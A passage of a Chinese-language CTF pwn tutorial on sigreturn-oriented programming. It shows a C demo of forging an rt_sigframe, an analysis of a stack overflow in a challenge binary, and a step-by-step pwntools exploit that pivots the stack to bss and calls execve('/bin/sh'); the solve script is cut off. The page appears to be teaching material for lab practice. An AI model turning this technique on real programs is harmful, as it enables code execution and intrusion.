+<a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="k">struct</span><span class="w"> </span><span class="nc">rt_sigframe</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">pretcode</span><span class="p">;</span>
+<a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">ucontext</span><span class="w"> </span><span class="n">uc</span><span class="p">;</span>
+<a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a><span class="p">};</span>
+<a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>
+<a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a><span class="kt">int</span><span class="w"> </span><span class="nf">ok</span><span class="p">(){</span>
+<a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">"it's works!"</span><span class="p">);</span>
+<a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a><span class="p">}</span>
+<a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a><span class="k">struct</span><span class="w"> </span><span class="nc">rt_sigframe</span><span class="w"> </span><span class="o">*</span><span class="n">rt</span><span class="p">;</span>
+<a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span>
+<a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">rt_sigframe</span><span class="w"> </span><span class="n">rt_sigreturn</span><span class="p">;</span>
+<a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rt_sigreturn</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">rt_sigframe</span><span class="p">));</span>
+<a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">ucontext</span><span class="w"> </span><span class="o">*</span><span class="n">uc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rt_sigreturn</span><span class="p">.</span><span class="n">uc</span><span class="p">;</span>
+<a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">sigcontext</span><span class="w"> </span><span class="o">*</span><span class="n">regs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">uc</span><span class="o">-&gt;</span><span class="n">uc_mcontext</span><span class="p">;</span>
+<a id="__codelineno-18-34" name="__codelineno-18-34" href="#__codelineno-18-34"></a><span class="w">    </span><span class="n">rt</span><span class="o">=&amp;</span><span class="n">rt_sigreturn</span><span class="p">;</span>
+<a id="__codelineno-18-35" name="__codelineno-18-35" href="#__codelineno-18-35"></a><span class="w">    </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">rip</span><span class="o">=</span><span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ok</span><span class="p">;</span>
+<a id="__codelineno-18-36" name="__codelineno-18-36" href="#__codelineno-18-36"></a><span class="w">    </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">rsp</span><span class="o">=</span><span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">rt</span><span class="p">;</span>
+<a id="__codelineno-18-37" name="__codelineno-18-37" href="#__codelineno-18-37"></a><span class="w">    </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">rbp</span><span class="o">=</span><span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">rt</span><span class="p">;</span>
+<a id="__codelineno-18-38" name="__codelineno-18-38" href="#__codelineno-18-38"></a><span class="w">    </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">cs</span><span class="o">=</span><span class="p">(</span><span class="n">__u16</span><span class="p">)</span><span class="mh">0x33</span><span class="p">;</span>
+<a id="__codelineno-18-39" name="__codelineno-18-39" href="#__codelineno-18-39"></a><span class="w">    </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">__pad0</span><span class="o">=</span><span class="p">(</span><span class="n">__u16</span><span class="p">)</span><span class="mh">0x2b</span><span class="p">;</span>
+<a id="__codelineno-18-40" name="__codelineno-18-40" href="#__codelineno-18-40"></a><span class="w">    </span><span class="n">ASM</span><span class="p">(</span>
+<a id="__codelineno-18-41" name="__codelineno-18-41" href="#__codelineno-18-41"></a><span class="w">        </span><span class="s">"mov rsp,rt;"</span>
+<a id="__codelineno-18-42" name="__codelineno-18-42" href="#__codelineno-18-42"></a><span class="w">        </span><span class="s">"add rsp,8;"</span><span class="w"> </span><span class="c1">//适配 frame = (struct rt_sigframe __user *)(regs-&gt;sp - sizeof(long));</span>
+<a id="__codelineno-18-43" name="__codelineno-18-43" href="#__codelineno-18-43"></a><span class="w">        </span><span class="s">"mov rax,0xf;"</span>
+<a id="__codelineno-18-44" name="__codelineno-18-44" href="#__codelineno-18-44"></a><span class="w">        </span><span class="s">"syscall;"</span>
+<a id="__codelineno-18-45" name="__codelineno-18-45" href="#__codelineno-18-45"></a><span class="w">    </span><span class="p">);</span>
+<a id="__codelineno-18-46" name="__codelineno-18-46" href="#__codelineno-18-46"></a><span class="w">    </span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-18-47" name="__codelineno-18-47" href="#__codelineno-18-47"></a><span class="p">}</span>
+</code></pre></div>
+<p>因为在用户空间api没有定义<code>rt_sigframe</code>等结构体,所以我们这里直接在C里面实现其结构体。另外为了确保CPU不会在syscall返回时候因为ss和cs错误的值抛出<code>#GP</code>（一般保护异常）或 <code>#SS</code>（栈段异常）最终被转换成SIGSEGV信号导致程序被杀死，我们要将cs设置为0x33，将ss设置为0x2b
+<strong><em>注意：这里的cs和ss的值仅是在大多数平台是这样设置的，具体环境需要读者自己使用gdb调试得到</em></strong></p>
+<blockquote>
+<p>tips:使用 gdb 调试时通过 info registers cs ss 获取cs和ss当前值。建议在 SROP 中统一使用 SigreturnFrame 而不是手动构造，因为 pwntools 会自动填充正确的 cs/ss</p>
+</blockquote>
+<p><strong><em>注意：在C标准库中当引入<code>sys/wait.h</code>等其他头文件时会自动包含<code>bits/sigcontext.h</code>这个头文件，此时就不要自己实现<code>sigcontext</code>这个结构体了。但还是推荐直接引入这个头文件，但是引入后，要注意ss寄存器在x64情况下结构体成员名叫做<code>__pad0</code></em></strong></p>
+<p>这里作者使用的是自己的头文件其中ASM宏被实现为<code>#define ASM asm volatile</code>使用指令<code>gcc -static  -o test test.c -masm=intel</code>完成编译。</p>
+<p>运行结果：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>──&lt;Just<span class="w"> </span>CTF<span class="w"> </span>For<span class="w"> </span>Pwn&gt;──<span class="o">[</span>~/hello-ctf/srop<span class="o">]</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>└─<span class="o">(</span>PLANA<span class="o">)</span>--&gt;<span class="w"> </span>./test<span class="w">                                 </span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>it<span class="err">'</span>s<span class="w"> </span>works!
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>zsh:<span class="w"> </span>segmentation<span class="w"> </span>fault<span class="w">  </span>./test
+</code></pre></div>
+<p>可以看到成功输出了<code>it's works!</code>。但这里之所以爆出了段错误，是因为我们没有给<code>ok</code>函数布置返回地址，导致ret的时候地址无效，抛出了段错误</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>   0x401dd7 &lt;ok+4&gt;     lea    rax, [rip + 0x8f567]     RAX =&gt; 0x491345 ◂— "it's works!"
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>   0x401dde &lt;ok+11&gt;    mov    rdi, rax                 RDI =&gt; 0x491345 ◂— "it's works!"
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>   0x401de1 &lt;ok+14&gt;    call   puts                        &lt;puts&gt;
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>   0x401de6 &lt;ok+19&gt;    nop    
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>   0x401de7 &lt;ok+20&gt;    pop    rbp     RBP =&gt; 0x7fffffffdb20
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a> ► 0x401de8 &lt;ok+21&gt;    ret                                &lt;0&gt;
+<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>    ↓
+</code></pre></div>
+<p>验证证明了我们的分析是没有错误的。</p>
+<h3 id="srop_1">SROP基本原理总结<a class="headerlink" href="#srop_1" title="Permanent link">¶</a></h3>
+<blockquote>
+<p>最后我们知道了，如果需要进行SROP攻击，需要我们在栈上布置<code>rt_sigframe</code>结构体。并且要注意栈空间的大小并且对齐栈指针，最后将rax设置为15，并调用syscall。
+<strong>注意</strong>：因为SROP极度依赖<code>rt_sigreturn</code>系统调用，所以当程序开启沙盒后可能无法使用。因为<code>sigreturn</code> 系统调用本身也可能被 <code>seccomp</code> 过滤（<code>rt_sigreturn</code> 号为 15），若被禁止则 SROP 无效。而且SROP需要一个超长的连续空间用于结构体布置，若栈空间不足请考虑其他解法。</p>
+</blockquote>
+<p>另外：</p>
+<blockquote>
+<p>SROP 的精髓在于利用内核“盲目信任” <code>Signal Frame</code> 的特性，以一次系统调用换取对所有寄存器的控制。它特别适合以下场景：</p>
+<ul>
+<li>程序没有足够的 pop rdi; ret、pop rsi; ret 等 gadget；</li>
+<li>程序自身含有 syscall 指令，且能控制 rax；</li>
+<li>栈上可以布置连续的大块数据。</li>
+</ul>
+</blockquote>
+<h3 id="srop_2">SROP题目示例<a class="headerlink" href="#srop_2" title="Permanent link">¶</a></h3>
+<p>我们首先先给出<a href="https://github.com/eroorvbsyes-hotmail/hello-ctf-pwn/tree/main/files">题目</a></p>
+<p>先用</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>file<span class="w"> </span>./srop
+</code></pre></div>
+<p>看题目的架构
+<img alt="01" src="../images/SROP/001.png"></p>
+<p>可以看见题目是一个64位的可执行程序。
+现在就可以开始想64位程序如何传参了</p>
+<p>再使用</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>pwn<span class="w"> </span>checksec<span class="w"> </span>--file<span class="o">=</span>./srop
+</code></pre></div>
+<p>来查看程序保护开启情况
+<img alt="02" src="../images/SROP/002.png"></p>
+<p>可以发现程序主要开启了NX保护，我们这时只能考虑使用ROP链来构造payload。
+不能使用shellcode</p>
+<p>再使用IDA Pro逆向程序(没有IDA的可以使用r2)
+<img alt="03" src="../images/SROP/003.png"></p>
+<p>发现程序main函数非常简单，只有几行汇编代码
+其中我们发现了syscall系统调用，它会造成一个系统中断，程序会将控制权交给系统内核
+然后进入内核态，内核会为其保存寄存器状态(称为Signal Frame)，然后内核会执行注册过
+的signal handler，执行后再退出内核态，控制权还回，但是Signal Frame是保存在栈上的，所以用户可以
+控制这些信息，这样就导致了SROP,寄存器就会被用户控制。</p>
+<p>其中main函数调用了系统调用号为0的系统调用(mov rax,0 //系统调用号通过rax寄存器传递)
+下面附上Linux 64位系统调用表（部分,详情可见<a href="https://blog.csdn.net/SUKI547/article/details/103315487%EF%BC%89">https://blog.csdn.net/SUKI547/article/details/103315487）</a>
+read：读取文件内容，系统调用号通常是0。
+write：写入文件内容，系统调用号通常是1。
+open：打开文件，系统调用号通常是2。
+close：关闭文件描述符，系统调用号通常是3。
+execve:执行一个命令,系统调用号通常是59
+exit：终止进程，系统调用号通常是60。</p>
+<p>那么0即是调用SYS_read，它允许我们输入0x400的数据，但是buf大小只有16(0x10)大小，很明显，
+这是有栈溢出的，而且没有canary保护，栈溢出变得更简单了。
+<img alt="04" src="../images/SROP/004.png"></p>
+<p>继续分析程序
+发现有一个叫做gift的可疑函数：
+<img alt="05" src="../images/SROP/005.png"></p>
+<p>其逻辑也是非常简单，它就传回了一个返回值15,众所周知，函数返回时是给rax赋值，那么这个函数就可以看
+作是mov rax,15;ret;这个gadget。那么有什么用呢，相信大家都想到了系统调用，正好15对应的就是sigreturn的调用号
+sigreturn会根据栈空间给寄存器赋值，以恢复进程调用前的状态，那么我们就可以利用sigreturn来
+篡改寄存器。</p>
+<p>那么如何获得shell呢？
+不难想到，我们可以利用SYS_execve("/bin/sh",0x0,0x0);来获取shell
+那么我们就需要调用调用号为59的系统调用，并给rdi赋值为/bin/sh的地址，给rsi赋值为0x0，给rdx赋值为0x0
+查找程序的字符串，并未找到类似/bin/sh或sh的字符串
+<img alt="06" src="../images/SROP/006.png"></p>
+<p>那我们就需要再次调用SYS_read函数来写入/bin/sh到bss段，刚好也可以布置我们的execve的Signal frame
+<img alt="09" src="../images/SROP/009.png">
+现在思路已经清晰了，开始上手吧！</p>
+<h4 id="_8">第一步<a class="headerlink" href="#_8" title="Permanent link">¶</a></h4>
+<p>先写好基本格式</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">"./srop"</span><span class="p">)</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="c1"># p=remote("challenge-1ee3de1a2f7456fc.sandbox.ctfhub.com",26839)</span>
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">"./srop"</span><span class="p">)</span>
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">bss_start</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span>
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="nb">print</span><span class="p">(</span><span class="s2">"bss_start : "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bss_start</span><span class="p">))</span><span class="c1">#方便确认bss段中的数据</span>
+<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="n">gift</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'gift'</span><span class="p">]</span>
+<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">"amd64"</span>
+<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="n">syscall_addr</span><span class="o">=</span><span class="mh">0x401179</span>
+</code></pre></div>
+<p>因为是64位程序，所以其rbp的大小为0x8
+则padding可以写成:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="mi">24</span>
+</code></pre></div>
+<p>下面我们使用pwntools中的SigreturnFrame()来构造虚假的Signal Frame
+为什么这样构造可参见第二步</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">frame</span><span class="o">=</span><span class="n">SigreturnFrame</span><span class="p">()</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="n">frame</span><span class="o">.</span><span class="n">rax</span><span class="o">=</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span><span class="o">=</span><span class="mh">0x0</span>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span><span class="o">=</span><span class="n">bss_start</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span><span class="o">=</span><span class="mh">0x300</span>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="n">frame</span><span class="o">.</span><span class="n">rbp</span><span class="o">=</span><span class="n">bss_start</span>
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="n">frame</span><span class="o">.</span><span class="n">rip</span><span class="o">=</span><span class="n">syscall_addr</span>
+</code></pre></div>
+<p>这里的Signal Frame实现了再次调用SYS_read来读入第二次的Signal Frame
+为了能调用Sigreturn我们必须先控制rip指向gift函数，再指向syscall
+则</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">gift</span><span class="p">)</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="n">payload</span><span class="o">+=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+</code></pre></div>
+<p>但是经过测试，发现爆出了EOF错误，怎么回事呢，我们使用gdb看看
+<img alt="07" src="../images/SROP/007.png"></p>
+<p>发现程序虽然跳进了gift但是未能执行syscall,而且当gift结束时rip指向了我们
+padding的rbp，那我们就修改我们的payload:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="mi">16</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401179</span><span class="p">)</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">gift</span><span class="p">)</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="n">payload</span><span class="o">+=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+</code></pre></div>
+<p>再次测试，发现没有错误产生。
+这样就可以正常输入了。</p>
+<p>第一步完成</p>
+<h4 id="_9">第二步<a class="headerlink" href="#_9" title="Permanent link">¶</a></h4>
+<p>现在我们把栈迁移到bss段上，因为在我们在二次伪造系统调用后栈结构
+已经损坏，无法继续使用，而且没有syscall;ret,我们就需要在bss段
+上伪造一个栈，栈(bss_start)的起始地址是bss()+0x100(bss_start)这是
+因为bss段在程序中只映射了一页(0x1000)而且，在bss段低地址处可能还存储着一些
+重要数据，我们不能破坏他们。
+这就是为什么我们要把/bin/sh写在bss段上的原因，在第一步的frame中，
+我们让read函数读入了0x300的数据，这已经足够伪造一个栈了。
+为了迁移栈，我们就把frame.rbp设置为了bss_start了。</p>
+<p>那么现在我们就已经将栈迁移到了bss_start上了。
+接下来构造执行execve的frame</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="n">frame1</span><span class="o">=</span><span class="n">SigreturnFrame</span><span class="p">()</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rax</span><span class="o">=</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rdi</span><span class="o">=</span><span class="n">bss_start</span><span class="o">+</span><span class="mh">0x200</span>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rsi</span><span class="o">=</span><span class="mh">0x0</span>
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rdx</span><span class="o">=</span><span class="mh">0x0</span>
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rip</span><span class="o">=</span><span class="n">syscall_addr</span>
+</code></pre></div>
+<p>那么/bin/sh就写在frame1的后面</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">payload2</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401179</span><span class="p">)</span>
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="n">payload2</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401136</span><span class="p">)</span>
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="n">payload2</span><span class="o">+=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">frame1</span><span class="p">)</span>
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="n">payload2</span><span class="o">+=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
+<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="n">payload2</span><span class="o">+=</span><span class="sa">b</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span>
+</code></pre></div>
+<p>第二步完成</p>
+<h4 id="exp_1">第三步(EXP)<a class="headerlink" href="#exp_1" title="Permanent link">¶</a></h4>
+<p>我们现在把以上的payload串联起来就可以了
+解题代码:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">"/root/Desktop/ctf/pwn/srop"</span><span class="p">)</span>
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="c1"># p=remote("challenge-1ee3de1a2f7456fc.sandbox.ctfhub.com",26839)</span>
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">"/root/Desktop/ctf/pwn/srop"</span><span class="p">)</span>
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="n">bss_start</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span>
+<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="nb">print</span><span class="p">(</span><span class="s2">"bss_start : "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bss_start</span><span class="p">))</span>
+<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="n">gift</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'gift'</span><span class="p">]</span>
+<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">"amd64"</span>
+<a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>
+<a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a><span class="n">frame</span><span class="o">=</span><span class="n">SigreturnFrame</span><span class="p">()</span>
+<a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a><span class="n">frame</span><span class="o">.</span><span class="n">rax</span><span class="o">=</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span>
+<a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span><span class="o">=</span><span class="mh">0x0</span>
+<a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span><span class="o">=</span><span class="n">bss_start</span>
+<a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span><span class="o">=</span><span class="mh">0x300</span>
+<a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a><span class="n">frame</span><span class="o">.</span><span class="n">rbp</span><span class="o">=</span><span class="n">bss_start</span>
+<a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a><span class="n">frame</span><span class="o">.</span><span class="n">rip</span><span class="o">=</span><span class="mh">0x401179</span>
+<a id="__codelineno-30-18" name="__codelineno-30-18" href="#__codelineno-30-18"></a>
+<a id="__codelineno-30-19" name="__codelineno-30-19" href="#__codelineno-30-19"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="mi">16</span>
+<a id="__codelineno-30-20" name="__codelineno-30-20" href="#__codelineno-30-20"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401179</span><span class="p">)</span>
+<a id="__codelineno-30-21" name="__codelineno-30-21" href="#__codelineno-30-21"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">gift</span><span class="p">)</span>
+<a id="__codelineno-30-22" name="__codelineno-30-22" href="#__codelineno-30-22"></a><span class="n">payload</span><span class="o">+=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+<a id="__codelineno-30-23" name="__codelineno-30-23" href="#__codelineno-30-23"></a><span class="c1"># gdb.attach(p)</span>
+<a id="__codelineno-30-24" name="__codelineno-30-24" href="#__codelineno-30-24"></a>
+<a id="__codelineno-30-25" name="__codelineno-30-25" href="#__codelineno-30-25"></a><span class="n">payload2</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401179</span><span class="p">)</span>
+<a id="__codelineno-30-26" name="__codelineno-30-26" href="#__codelineno-30-26"></a><span class="n">payload2</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401136</span><span class="p">)</span>
+<a id="__codelineno-30-27" name="__codelineno-30-27" href="#__codelineno-30-27"></a><span class="n">frame1</span><span class="o">=</span><span class="n">SigreturnFrame</span><span class="p">()</span>
+<a id="__codelineno-30-28" name="__codelineno-30-28" href="#__codelineno-30-28"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rax</span><span class="o">=</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+<a id="__codelineno-30-29" name="__codelineno-30-29" href="#__codelineno-30-29"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rdi</span><span class="o">=</span><span class="n">bss_start</span><span class="o">+</span><span class="mh">0x200</span>
+<a id="__codelineno-30-30" name="__codelineno-30-30" href="#__codelineno-30-30"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rsi</span><span class="o">=</span><span class="mh">0x0</span>
+<a id="__codelineno-30-31" name="__codelineno-30-31" href="#__codelineno-30-31"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rdx</span><span class="o">=</span><span class="mh">0x0</span>
